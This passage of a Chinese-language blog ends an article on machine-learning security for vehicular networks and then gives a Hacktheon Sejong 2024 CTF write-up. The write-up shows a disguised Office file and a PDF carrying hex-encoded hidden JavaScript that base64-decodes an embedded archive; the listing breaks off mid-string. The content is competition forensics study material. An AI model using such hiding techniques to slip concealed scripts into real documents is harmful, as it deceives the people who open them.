 💡 隱私保護技術旨在通過確保未授權方無法訪問這些敏感信息來保護這些信息。 這可以使用加密、匿名化或差分隱私等技術來完成。

 </aside>

 <aside>
 💡 例如，在車載網絡中，位置隱私是安全的關鍵要求。 知道車輛位置的攻擊者可以使用此信息發起干擾或竊聽等攻擊。 因此，可以使用 k-匿名或位置混淆等技術來保護車輛位置的隱私，同時仍然允許授權方（例如服務提供商）訪問此信息。

 </aside>

 <aside>
 💡 同樣，用戶隱私在車輛網絡中也很重要，在車輛網絡中，駕駛員識別系統可用於訪問控製或個性化服務。 同態加密或安全多方計算等技術可用於保護駕駛員身份的隱私，同時仍允許授權方驗證其身份。

 </aside>

 <aside>
 💡 總的來說，隱私保護技術對於保護車載網絡上的敏感數據和確保車載網絡安全可信至關重要。

 </aside>
</li>
<li><p>結合多種 ML 技術的混合方法可以提高安全解決方案的準確性和穩健性。</p>
 <aside>
 💡 混合方法結合了多種 ML 技術，例如監督學習、無監督學習和強化學習，以提高車載網絡中安全解決方案的準確性和穩健性。

 </aside>

 <aside>
 💡 監督學習是一種 ML 算法從標記的訓練數據中學習以做出預測或決策的技術。 無監督學習是一種 ML 算法從未標記的數據中學習以發現數據中的模式或結構的技術。 強化學習是一種技術，其中 ML 算法通過與環境交互並以獎勵或懲罰的形式接收反饋來學習。

 </aside>

 <aside>
 💡 混合方法可以結合這些技術來利用它們的優勢並克服它們的劣勢。 例如，監督學習可用於從標記數據中學習並對已知威脅做出準確預測。 無監督學習可用於發現數據中可能指示以前未知威脅的新模式或異常。 強化學習可用於學習動態環境中安全決策的最佳策略。

 </aside>

 <aside>
 💡 此外，混合方法(hybrid approach) 還可以結合其他技術，例如基於規則的系統或專家系統，以提供單獨使用 ML 算法可能無法捕獲的額外上下文或領域知識。

 </aside>

 <aside>
 💡 總體而言，結合多種 ML 技術和其他技術的混合方法可以利用它們的互補優勢並提供更全面的安全挑戰解決方案，從而提高車載網絡安全解決方案的準確性和穩健性。

 </aside>
</li>
<li><p>一些 ML 算法的計算複雜性在資源有限的車輛網絡中可能是一個挑戰。</p>
 <aside>
 💡 ML 算法的計算複雜性在資源受限的車輛網絡中是一個挑戰，包括深度學習 (DL) 算法，例如卷積神經網絡 (CNN) 和遞歸神經網絡 (RNN)。 這些算法需要大量輸入數據和計算資源才能實現高精度，這在資源有限的車載網絡中可能是一個挑戰。

 </aside>

 <aside>
 💡 為了應對這一挑戰，研究人員提出了幾種方法或替代方案。 一種方法是使用輕量級 DL 模型，這些模型旨在提高計算效率並需要更少的資源。 例如，一些研究人員提出在預訓練的監督 LSTM 模型上使用一次性遷移學習來檢測車輛網絡中的入侵 [94]。 這種方法使用輕量級 DL 模型，該模型需要較少的計算，同時仍能實現高精度。

 </aside>

 <aside>
 💡 另一種方法是使用傳統的 ML 算法，例如決策樹或支持向量機 (SVM)，它們的計算複雜性低於 DL 算法。 這些算法仍然可以提供有效的安全解決方案，同時需要更少的資源。

 </aside>

 <aside>
 💡 此外，研究人員還提議使用邊緣計算或霧計算架構將計算從車輛網絡中資源受限的設備卸載到更強大的邊緣或霧節點。 這可以減少設備的計算負擔，同時仍然提供準確及時的安全解決方案。

 </aside>

 <aside>
 💡 總體而言，有多種方法和替代方案可用於解決基於 ML 的車輛安全解決方案中計算複雜性的挑戰。 這些包括使用輕量級 DL 模型、傳統 ML 算法，或將計算卸載到更強大的邊緣或霧節點。

 </aside>


</li>
</ol>
</li>
</ul>
<hr>
<p><img src="img/vehicle_353785_0.jpg" alt="353785_0.jpg"></p>
<p><img src="img/vehicle_353788_0.jpg" alt="353788_0.jpg"></p>
<p><img src="img/vehicle_353787_0.jpg" alt="353787_0.jpg"></p>
<p><img src="img/vehicle_353786_0.jpg" alt="353786_0.jpg"></p>
<p><a target="_blank" rel="noopener" href="https://www.notion.so">https://www.notion.so</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-hackthonkor" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/hackthonkor/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.084Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/hackthonkor/">
        Hacktheon Sejong 2024
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="hackthon-kor"><a href="#hackthon-kor" class="headerlink" title="hackthon kor"></a>hackthon kor</h1><p><a target="_blank" rel="noopener" href="https://mandu-mandu.tistory.com/m/472">https://mandu-mandu.tistory.com/m/472</a></p>
<p><a target="_blank" rel="noopener" href="https://hacktheon-ctf.org/dashboard">Dashboard (hacktheon-ctf.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://hacktheon-ctf.org/flag.html">flag (hacktheon-ctf.org)</a></p>
<hr>
<p>前言:</p>
<p>我在這之前很少參加CTF競賽，也是沒有找到隊友的緣故比較喜歡一個人做研究</p>
<p>首先，感謝願意和我組隊的隊友們，一位馬來西亞、一位印度、一位台灣</p>
<p>如果沒有他們，我應該也沒有機會參加這種競賽，雖然印度的隊友當天比賽沒出現，但也從馬來西亞的朋友身上學到很多，我很感謝他的出現~</p>
<p>我不是CTF專家，透過這個比賽更知道自己的不足，雖然小可惜沒進入決賽，但希望未來繼續提升自己能力，直到能達到目標的那一天!!!</p>
<p>再次感謝我的隊友們!!</p>
<p>底下有些題目是賽後才解出來的，謝謝我隊友的朋友，隊友強，隊友的朋友也強哈哈</p>
<p>幸好有人能諮詢，我也再次的熬夜去複習並找出flag</p>
<hr>
<h3 id="MS-Office"><a href="#MS-Office" class="headerlink" title="MS Office"></a><strong>MS Office</strong></h3><p>使用binwalk工具可以看到該文件應該是ppt檔案</p>
<p><img src="img/hackthonkor.png" alt="Untitled"></p>
<p>把xlsx副檔名修改成ppt打開文件就能看到裡面的文字</p>
<p><img src="img/hackthonkor_1.png" alt="Untitled"></p>
<hr>
<h3 id="Confidential"><a href="#Confidential" class="headerlink" title="Confidential"></a><strong>Confidential</strong></h3><p>使用pdftotext找出隱藏在pdf內容中文字，看起來沒料</p>
<p><img src="img/hackthonkor_2.png" alt="Untitled"></p>
<p><img src="img/hackthonkor_3.png" alt="Untitled"></p>
<p>不過後來我隊友很快解出來了，然後我就一直去騷擾問他怎麼解的，感謝他的幫助</p>
<p>there was a hidden javascript encoded code inside it</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/S /JavaScript</span><br><span class="line">/JS &lt;76617220656E636F646564537472203D20225545734442416F4141414141414141414951442F2F2F2F2F73414541414C414241414151414141415733527959584E6F585338774D4441774C6D526864502F2F2F2F3841414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414146424C417751554141594143414141414345414D4235704777454241414378415141414551415A41475276593142796233427A4C324E76636D557565473173494B49564143696741414141414141414141414141414141414141414141414141477951543076454D42544537344C666F655465704F6E71736C7661374D325467714343313543383751616250795278752F767454574F744654774F4D2B2F4876476B50467A30555A2F424257644D6869697455674246574B744E33364F33316F647968496B52754A422B73675135644961414475373170685775453966447372514D66465951696B55786F684F76514B55625845424C45435451504F43564D4D6F2F57617836543944317858487A77486B68645656756949584C4A497963547348514C456331494B52616B2B2F5244426B68425941414E4A675A434D53572F325168656833385073724E4B616857764C7630303131327A706667326C2F516C714355346A694D654E376C47366B2F4A2B39506A533336315647626153674269307A34657A6D72616C573161737061544E302F4F397068576437696D57337866302F307542332B384C50364F7A4C34414141442F2F774D41554573444242514142674149414B4B446446675870546F3470774141415051414141415541414141643239795A4339335A574A545A5852306157356E637935346257794E6A6B454B776A41515266654364776A5A323151584971564E516151585541395130326B6261444A684A68727839415A303438376C352F50666633583764497434414C46463338687455556F42337542672F64544936365862484753723136733656516C755A34677846797A7979484E466A5A786A444A565362475A7750526359774F647552484A397A4A456D68654E6F445A7A513342333471485A6C7556634553782F7A4963383273507A53306A2B30684451455167504D5763517448353772725A63364F324B4931746B58644568487773524151756C612F636A724E31424C417751554141594143414369673352594E416D69644A494141414451414141414567414141486476636D51765A6D397564465268596D786C4C6E68746249324F545172434D42434639344A334B4C4F3371533545536E383234676E30414347643245417A4532616939666747374146635074376A6531383366754A53765645304D5056777242756F6B427850675A3439504F36337777584759622F723174597A5A61334B6E4C5356487561635532754D75686D6A315A6F5455756B385337533552486B61396A3434764C4A3752615273546B317A4E6F4B4C7A65564B353541554E7472364432316C6D5A4B7751395869467063664C3970414D48526D3078752B554573444242514142674149414B4B44644669524475303130514D414144384E4141415241414141643239795A43396B62324E3162575675644335346257793156383175347A59517668666F4F7869364A3549733233474D32497474306978796142456B32374E4255375246725067446B724C69506655564372544841723374412B7862646673514866354973534D3374623374785349314D39393838334649305664766E6C6A5A57784F6C716544544B4431506F683768574F535572366252542B39767A3862526D396D3333317A566B317A6769684675656844423957524E706C46686A4A7A45736359465955696643306B34474A64434D575267716C5978512B70444A632B775942495A7571416C4E5A75346E79536A4B4D43496156517050676B515A3478694A625259476873794563736C785351386D6768315346346665524D6F753479784969567745467758564F6F476A5A324B4269555744636A3674534C5772477A38616E6C49746C79684775526E706164644335564C4A54445247743765654F4D7A596A726F594C59696E6F4F49735A6369746A41416D435A75394D2B4161664A614D5746464C46684C6F5A4E2F54782F73467447557868446C4C597945686E765255456356386B364A53725A6F764E75657236456C4979664C396C4C707236507A5743424A576A6F53667833614E654A72394E7930586251396D762F7233717450363530746B644C68635758314F79725434774265647538642F3942716E4934777A592B44613159396873674742374873514A537755653275756F695A79456D5A745368314F744C4874574136444F4C45657350495539526A65484B33346B4B6852516C497346693957747166644E685178552B486C6274466442446A41696C6A386630356A702F536F3047473857553837674C315477434338366966647147796F364647735758564B6537413033464C495173457244704942376236533651397859314F4B693774647A6C646E496155645A48477079453974394D4D7267674C6B572F7355377166653255665769494D3336316550536B704A772B5637575655475247464E394F6F5037794D5A6C64783632716A6C413965674E4D616C5841783852344C61384F69464B6F784F436758375636376A4238623432416367442F363939653661376E577A6C626B6A516D58424B6B51562B5457714734464E7A595561557A6877507279365A652F66762B35392B666E503737382B70757467794274336D714B3970694B74317A764338487765646E46635558345648356F4A514256704A664369666D614C50712F4C5273796832786D646A6648694A7635496974707473376D6D3653617938724D3058784A7932796563686A643339786173735A543938536473415162563041366E4379464D4677596369334B697646324C667A616475303276416E784776434B33544C544C46524F4D47576F3945766C5454594552673945477A6A6B476B634D793064354A5372642B67615034502B343752316144574463612B7369525574576F6858355468676A6D4D63436B7974326C796A6875533130482B74533145513943495A3453775A712B762B4A772F5839653537766B7436684B566550746F4E7132477A707062326731354D4378714E78466E615264584271724835416476385A4164665A39434A4A3356596D53774F7A7751442B514E694477437230504664305657795A43344A7941766634693252737661313257394E565A647730435752744F702F33783471393330686951786A4137545341584157726459566933796C7174375142662B7535524656704846453468653670775642624E6E4A6B37556E2F434B63552B495755496477747241344E444D33746A7A6359674E3339465A72394456424C4177515541415941434143696733525966594A477450494341414157435141414477414141486476636D5176633352356247567A4C6E6874624D56577A5737554D42432B492F454F55653574647064535164533071725A5556494B79676C616376593533592F4250734C314E32784F76674152484A473438414739466551686D624B65622F514732456F4A544D76376D66373578736E64774B55567977597A6C57685670663775584A6B7852585849314C644C7A732B4F74522B6E422F76313765303175335A56674E6746395A584E4A693752797273367A7A4E4B4B53574B336463305567424E744A4845676D6D6B6D69586B377137656F6C6A5678664D77466431665A6F4E666254614D6273346B58505A6C77796F34306E556D6D6E4C66504442506755537462386471323370704E764458616C4C58526C466B4C4E556F522F456E43316132622F73364B49386D7030565A50334459556B34574D4D6E51463576326566354D69335963326C5A6F6573516D5A435764527245636D696C4843787875614E506B46455555363171344373777A50454C45316F5A415777475469474C536E7639734C654552517959794D4E326D66454D504C6937454137555432756B314F7464436D4455356D5467666E2F746A4876323742515276334F70775037536F7939435861716D77684B6867784D642B71584569796D7736557539516D54793777556F6257516430705350373070437A53305173767536756146576C4E444A6B61556D506A6D6C7752796472777038673948414D4577484F50733076583475676D67484349344C746A7A315A2F6476766535444D2B4D6C7762594774727552554E357769612B385A764E6B3742465873354535432B377A7234785A4D6948547838485073564A6F397532376E476D545738314D31514B32653061504F4A772B6C4361496D2B5834456A6476526B53624F444C4371652F6C4C78314C636C3168687A73582B58483144724D52534731434B57636C366B4E31382F2F506A3850766E2B3763764E78302F49415561734F37536372494771513258586D564337724F77724361484361397759547A447378782F354E3842634176396F4251536B734A30722F4976376C6F786168695A5933622F6A6F325753502B566C795A53767369734371565846532F613659757263737243627930655265762F7A6D74683849672F6D4533466B4C4E6A4B4E4D4A746B4A784673484D6E7A4C65344A662F362F585A6A6755534277592F466B416E786E48674A4C6D326E35533066796B7543716344584A32356C774E464F73416C65506F45336337312B3731456742654B6F5A2F69302B713269562F435A3648714E77786A5936646F50666A46646B4534555874484C61625257486D384E3737775A4F2F4D35714A6B634D775066727A577A534A35786535645632485247585A4C44694C766952707848472F797A4352766A2F33483266774A5153774D4546414147414167416F6F4E30574F62777A663870427741414E683841414255414141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577A7457553976327A595576772F5964784230642F31506B753267626D484C64724F31615976613764416A49394D5747306F304A4471705552515932754F4141634F36595A6342752B307762437651417274306E795A62683630442B68583253466F533554394B326D5348416B6D4152434C663737306648782F664938584C5678384731446A4555557859324461726C79716D67554F506A556B34625A743352344E53307A52696A7349786F697A4562584F4259394F346575586A6A347A4C614966374F4D414761416A6A486451326663356E4F2B56793745457A69692B784751366862384B69414846346A61626C6359534F51484E417937564B78536B486949536D45614941464E2B615449694844616E53764A496F37314F7745504A594E486730476772564F49655173754F44717043494637464C492B4D513062594A647362736149516663744F674B4F6251305459723867636735555259506937686C472F526F6D6B59794A38314455766F2B4B416D655554542F5A53495A646D5730316B69564D6653714A536C66423353622F536476724D4F57636F697A774F664B4B36364A62766236766273645A676D72783433574F7731657658714E716955563944363276673674766A6442705879436D71745151634446795A6B4731544B4B3669394272577352733231746B476C764949366139424770644F7A477475675574366E4A44785941315A73702B3575634649715057463064794F795A567544526D33645A41614167457A6A57786965734A4276692F594150574452414153454945576368415A667A5041456562434F33767A3431622F6666323738382B4B484E382B2B4D59305A436C6B4D7A5A56615A56437077312F7861386D6E7066656B4171454A4930324E346F71523650446974513550726B6842306F6939694D7834322F7755544A6D61344E74585037393939634A342B2B7235385A4F587830392B4F33373639506A4A723071764143616A544258736F6E43714B386950524B365A62546A49535A6B482F767A6C697A392B2F3772594543534644504436322B642F76587A2B2B7273762F2F37705751477345364639485459694159364E6D2F6A49754D4D4347487342513777667652397935434F69497A76684E455968456C594C375057356E3050645843434B437553374F4F2F356578456B7A794C4174666D4433494347666A546E704D444364542F49416659596F313057465872747575436754644E6F486B364C5355567A5866344F516F64466E46775535754B6D50353942645346464A6C776635345A786D364B516F796B4F4D546445487A7641754D414C39776E4A7A6373653853495773776B3337684F6A693069684330646B50786531475869584244432F69794C6945456335582B37644D37714D466E6D6E68772F7A434669646942594D626F52707A763358304A796A6F4D6A45434156556E3741626950744667786775496B2B5837386363496D694B4B54503659787A4852646862456668484336627243424A3159546A7430555751523053634842545A7549455930784539647544364B4A67565959596B3948584D4A2F45424C41316B33476138434C624838697457764D4E386F7644454D4C70486343364D54702F4637704A706A6D6F57674B4A6E48685845786A584D6375746D754B415468484D7045777067727134464A48792F496D646646446C526A71476135756235505974634A794B4671333533706253644A4C3961304677576A636D48583839366142376578724355743238434C73705A6272743455633475796C6D3639542B2F636E5A532F766E2F693168577436436B695A4258787A683533416D326E756B6D684E4968583142384935596E6F7869712B5867416A51496E76366A67394976437A4964486C576E5348706C3363714270684B514349324C384D384C396F59396D63424155353165304D343258647161784D574D786E41396C6336704F66554E4A444D45706378377373624671725662465678526C5837564C6A6F686E456855376C59686C7535434163797058477078473269306146586635615163474A742B6D386E795A6B425061336F57675A6E34627758724B5942504252745A394B6F4C53492B664D7346584973436C4D716A6B6F594167526D4D34303748634E32433233546473434B4942683953474B78327275515249456C4F2B586753506A3544794453486C36475554774353495A5144594475544344665677696B633169466B51744D597754505341636F434C3846454755493668462B5461435147444A49434D592B32694D6B7A466D41724C357845422F317A68715A5547694D6442586F7644686B6D4D32436F316A6F356E31432B5A624B4A34786B45516D58456C774E4E54544851324E6F3762703147304953772F4E32755945506B7642597A43442B497A46575166524B58796739726849664A41527A3577655A31484D65796A323156524A665371596B6735684A6941635277596C51647355666B6F384B5A756C70796773475667356B6E3231426D6E7441366266677254353464455869537358536E6779775237586730747245624F6C586D5839412F436D4E776E4F524664657A3468454F32774F55545830783066475070314864784345754E326F43756550535178487436716169544742473473305757667876314C517865714742614666424D6851566532497A6E7930724C705A7870577461716C724E7849704C396C54344A6A55626271583936646975364B336E4832526E6B61447672466F5A66734F565258424D586F324650754F6C57774959306C3350636F6A656D6F35313032555672757971646A494D366C56676C793666394B79646D737461363973305462557A72574276764D65532B4F6632642F4958777876786338776B71777969724B56394B757173386F2F633142533245376766357253715446774D674F795661346850565132464D364E444B44784C467373674B3875484769614A416346475A4879546C532F4357583744794446396544475A30374633536767567073677354324572364F776E78374B6A585761744E5A6270656A794F4141675978365274766D6F596E6373743261377055725437706573756C55704E65314F766453783758713162316372765737744D6151653767645657393045442B427A4C31307337344E6C2B397164634A42383862376B7361444D354A31765759355033676C58613576756845666930746330434F544A52303574304B7133756B36705665384D536C617632797931584B6462366A6C756F7A666F7558617A4E586873476F6453324F7255586376704E30744F3158564C6C6C4D52394A757455734F71315470576F39507357783078426D43774D676A7055334247386A39786E3652363554395153774D4546414147414167416F6F4E30574330513363646E4177414172676741414245414141423362334A6B4C334E6C64485270626D647A4C6E6874624A3157323237624F4242395832442F7764427A665575546F424469464768634E2B6B6D33514471747338554E624B4A3843494D4B577664722B2B514643306269644F695436466D7A70793538484363712F662F4B7A6E61416C706839434B625432625A434451336C64447252666266313958345866622B2B752B2F72727263676E4E6B74534F4B30445933693678466E56752B4163587357416D4F787072616A626C5275616C727761482F6B2F5552754D67327A6A5835644E6F48545577446D74687167346F354F7A47346E736249706547744175326D5A37505A355252424D6B66313259316F62474A54663870477154614A5A5074614531736C453636627A3135443975313242717439784F2B5535774D614E42797370636B7147647456544F6845592B5876384D5235336F73534765344F534B3770326E34596F305A643367427947696864385779575856394E6F384D444C4E764349384A575150636F754773526776736C4D3947674D5858686D41506974413149475954434A54437175637658794A5269644E505245706947474A2B7567707131306E316C5A65464D51794662526A322B5331556475304F417349316B75317544346F66526A736B6C736F3679666B4A526653546C37684A48333166314B2F7742365464414A2F687079724D3471703779464E6F546176505961707065454F6F2F674A6F71444E322F374F6879766D484975414D734773594A66454F396F5A47706D6370384D65374771415A4A484C474B4578452B65306C436F6A65383945464669326861586430434931756F3454583379384572593669306B38484A54573151696379464770686B6D6B4E4276556A3473484F774E47305A5439394635546152374A65674C6D38747244376573353170695A6545657653644D685A78473947344E464E416567743169464A493458595070674B7678686246732B657A5831515443756E587A54532B3346364C3834742B336F4779547851715363327133432B5252357050504B336F376B624B4B376D6C556D36594B6C477730594E664E4251335944792B784B635051672F6F456D6A395163524633344171326E49416A73654849484A356E46564D7968554A616344524D6F7241766338447659535855496479396D65567977654736384E79776950613233306B6E6F4430396B414F3965654443767969416678454B6D78694A66536F50334D50374A413164376F692F3144762F507938547A703450565A6F64792F55674C4E745753544336504D6F545276764345624B2F33654C4D572F76334E2B42767A45536B4D54432F327242413273615569734A70567A5046356B5536343262653930342B716F59506F5750636E33572B3836436A3736384C337777376E736C64482F776748676B5648385962472B54376531674F302B32383846326B577758672B30793253363962624F6A6655367239346E6B6E593765586873705451665662544975736D636D5035726E512F43444354766E546E505A566B44367167793364396F7665787443586E5037766334466962485971584C5959704F59374D6A6E4D306C685851454E6255426E6B4F6F4F7677467649766A4946784B6E2F7A797566774A5153774D4546414147414167416F6F4E30574472392B702F72414141415A674D41414277414141423362334A6B4C3139795A57787A4C325276593356745A5735304C6E6874624335795A57787A725A4C4C62734D67454558336C666F5061505931647670515651566E4530584B746E552F674F4478513755424D644E482F723749556C7569657547464E306A33416E664F77477833582B4D67506A425137367943497374426F445775376D3272344C553633447A437272792B326A376A6F446D656F6137334A4F496C53776F365A76386B4A5A6B4F5230325A38326A6A5475504371446E4B304571767A5A7475555737792F4547474E41504B693078787242574559313241714D34656C32533770756B4E377031354839487954416C4A794277626F5A697051347573344D664A496D636B6B476C6238304362565948345047434B4D2B6E6C4D4C6472776E7A69366558664179586D637179374E6245615A376E537077482F66753358576F353076795953782F6C4F63435970703757594A3771594B79712F4156424C41775155414159414341436967335259777432507A2B41414141426E4167414143774141414639795A57787A4C7935795A57787A725A444E61674D784449547668623644385433725451716C6C48687A4B595863536B6B66514E6A61585A503442316C4A30376576794B565A5745716750556F6144642F4D656E4F4F423356437169456E7135644E7178556D6C33314967395566753966466B39353039336672647A77416936614F6F56516C54366C6150544B585A324F71477A464362584C424A4A632B557753576B515A54774F3168514C4E7132306444317836366D33697172626561746E367031653672344E2B385455514744777A475A634A464953456A446C6A46484768417474706E39796272656C453051693038356A726B504E377164727A63393848685333624869496C6E476A42345A6B77652F652B41554D727466412F2F7954644E384E50645A795A76704D424C73486D32535A57312B775A5153774D4546414147414167416F6F4E30574976337A4A4278415141413267554141424D41414142625132397564475675644639556558426C6331307565473173745A544C54734D7745455833535078443543314B334C4A41434358706773655356714A38674F4E4D576F4E6A573762372B6E736D53524F685571684D31553255683333757665504A704A4E744C614D315743653079736734475A4549464E656C5549754D764D3966346E737979612B7630766E4F674974777358495A575870764869683166416B3163346B326F50424C7057334E504437614254574D66374946304E7652364935797254776F482F754751664C30435371326B6A353633754C7254726751696B5350336270474B69504D47436B34382B694C726C563549424C7271684963537331584E6149544C57466166414433694B64372F6C456843394B464B65326A4A4C697A64654F57777267627A48744B716C6E7965365A447742515077596F536F686D7A2F70585657414B4B38575A5747306578474D6E66754E4D6C677162614A5A5378515352594C3242493057766E615839333141585846734A7439505672646764726237517471664D37435335632B61424847685A6D352B4163646E63746B343762483255662F5867524F69506750573639684A55394F63444D426F7133692F6E3542672B774E50794F352F62716A364D61794455544B73425268534E6C7A6772356A373439315430444F73434F7834454A744C324F7A2B376E46764E546E4C616A4F76384355457344424251414267414941414141495142307A74497772774541414A454441414151414141415A47396A55484A7663484D76595842774C6E6874624A7854775737624D4179394639672F474C6F33646F4A684B414C61785A426936474846417352747A35704D32384A73535A42596F2B6E586C376151526C6C336D6B2B506A39545449796E44376573345A4250366F4B3070785870566941794E736F303258536B6536782F584E79494C4A45306A423275774645634D347262366367563762783136306867796C6A436846443252322B5A355544324F4D71773462546A54576A394B34744233755731627266444F71706352446557626F766957347975686162433564682B43496970754A2F70663063617132563934716F2B4F4456645157354A447255657343736A504165786C6836466151783442504676664C484545734F756C6C347034507650424A414C75346F4471785773367A716B30684A2F617343717A45664174586E5A65756E34686B776765486E614464677439676E425163734164323639614F5153452F457A41506370354E5875703252464D744A31516B66565A30472B386E4933496673754163394F6C6D4B54583068413350356646594D4744432B5372577450413270794C38514C5473685472722F4F4D754A62425A65464D52672B63754853333342422B746477762F6350734F6A5737654968574533735A38657634354848706D472F375335396E2F5363387574726553634C543643374A5A4A33506D7671446B79727536627A59684963444C7838623375784A37557A4150632F59442F4F56664E5A30324A78715069666775334E5038512B723170745677522F6B43636550372B5070562B38414141442F2F774D41554573424169304143674141414141414141416841502F2F2F2F2B77415141417341454141424141414141414141414141414141414141414141414141467430636D467A614630764D4441774D43356B59585251537745434C5141554141594143414141414345414D4235704777454241414378415141414551414141414141414141414141414141414465415141415A47396A55484A7663484D76593239795A53353462577851537745434C514155414159414341414141434541463655364F4B63414141443041414141464141414141414141414141414141414141416E41774141643239795A4339335A574A545A5852306157356E6379353462577851537745434C5141554141594143414141414345414E416D69644A49414141445141414141456741414141414141414141414141414141414142414141643239795A43396D623235305647466962475575654731735545734241693041464141474141674141414168414A454F37545852417741415077304141424541414141414141414141414141414141417767514141486476636D51765A47396A6457316C626E517565473173554573424169304146414147414167414141416841483243527254794167414146676B4141413841414141414141414141414141414141417767674141486476636D5176633352356247567A4C6E68746246424C415149744142514142674149414141414951446D384D332F4B516341414459664141415641414141414141414141414141414141414F454C4141423362334A6B4C33526F5A57316C4C33526F5A57316C4D53353462577851537745434C5141554141594143414141414345414C524464783263444141437543414141455141414141414141414141414141414141413945774141643239795A43397A5A5852306157356E6379353462577851537745434C5141554141594143414141414345414F7633366E2B73414141426D41774141484141414141414141414141414141414141445446674141643239795A433966636D56736379396B62324E31625756756443353462577775636D56736331424C415149744142514142674149414141414951444333592F5034414141414763434141414C414141414141414141414141414141414150675841414266636D567363793875636D56736331424C415149744142514142674149414141414951434C3938795163514541414E6F4641414154414141414141414141414141414141414141455A414142625132397564475675644639556558426C633130756547317355457342416930414641414741416741414141684148544F306A4376415141416B514D4141424141414141414141414141414141414141416F786F4141475276593142796233427A4C32467763433534625778515377554741414141414177414441442F416741416742774141414141223B0D0A0D0A66756E6374696F6E206261736536344465636F646528737472297B0D0A2020202072657475726E2061746F6228737472293B0D0A7D0D0A0D0A766172206465636F646564537472203D206261736536344465636F646528656E636F646564537472293B0D0A636F6E736F6C652E6C6F67286465636F64656453747229&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="img/hackthonkor_4.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var encodedStr = <span class="string">&quot;UEsDBAoAAAAAAAAAIQD/////sAEAALABAAAQAAAAW3RyYXNoXS8wMDAwLmRhdP////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBLAwQUAAYACAAAACEAMB5pGwEBAACxAQAAEQAZAGRvY1Byb3BzL2NvcmUueG1sIKIVACigAAAAAAAAAAAAAAAAAAAAAAAAAGyQT0vEMBTE74LfoeTepOnqslva7M2TgqCC15C87QabPyRxu/vtTWOtFTwOM+/HvGkPFz0UZ/BBWdMhiitUgBFWKtN36O31odyhIkRuJB+sgQ5dIaADu71phWuE9fDsrQMfFYQikUxohOvQKUbXEBLECTQPOCVMMo/Wax6T9D1xXHzwHkhdVVuiIXLJIycTsHQLEc1IKRak+/RDBkhBYAANJgZCMSW/2Qheh38PsrNKahWvLv00112zpfg2l/QlqCU4jiMeN7lG6k/J+9PjS361VGbaSgBi0z4ezmralW1aspaTN0/O9phWd7imW3xf0/0uB3+8LP6OzL4AAAD//wMAUEsDBBQABgAIAKKDdFgXpTo4pwAAAPQAAAAUAAAAd29yZC93ZWJTZXR0aW5ncy54bWyNjkEKwjAQRfeCdwjZ21QXIqVNQaQXUA9Q02kbaDJhJhrx9AZ0487l5/Pff3X7dIt4ALFF38htUUoB3uBg/dTI66XbHGSr16s6VQluZ4gxFyzyyHNFjZxjDJVSbGZwPRcYwOduRHJ9zJEmheNoDZzQ3B34qHZluVcESx/zIc82sPzS0j+0hDQEQgPMWcQtH57rrZc6O2KI1tkXdEhHwsRAQula/cjrN1BLAwQUAAYACACig3RYNAmidJIAAADQAAAAEgAAAHdvcmQvZm9udFRhYmxlLnhtbI2OTQrCMBCF94J3KLO3qS5ESn824gn0ACGd2EAzE2ai9fgG7AFcPt7je183fuJSvVE0MPVwrBuokBxPgZ49PO63wwXGYb/r1tYzZa3KnLSVHuacU2uMuhmj1ZoTUuk8S7S5RHka9j44vLJ7RaRsTk1zNoKLzeVK55AUNtr6D21lmZKwQ9XiFpcfL9pAMHRm0xu+UEsDBBQABgAIAKKDdFiRDu010QMAAD8NAAARAAAAd29yZC9kb2N1bWVudC54bWy1V81u4zYQvhfoOxi6J5Is23GM2Itt0ixyaBEk27NBU7RFrPgDkrLiPfUVCrTHAr3tA+xbdfsQHf5IsSM3tb3txSI1M99883FI0VdvnljZWxOlqeDTKD1Poh7hWOSUr6bRT+9vz8bRm9m331zVk1zgihFuehDB9WRNplFhjJzEscYFYUifC0k4GJdCMWRgqlYxQ+pD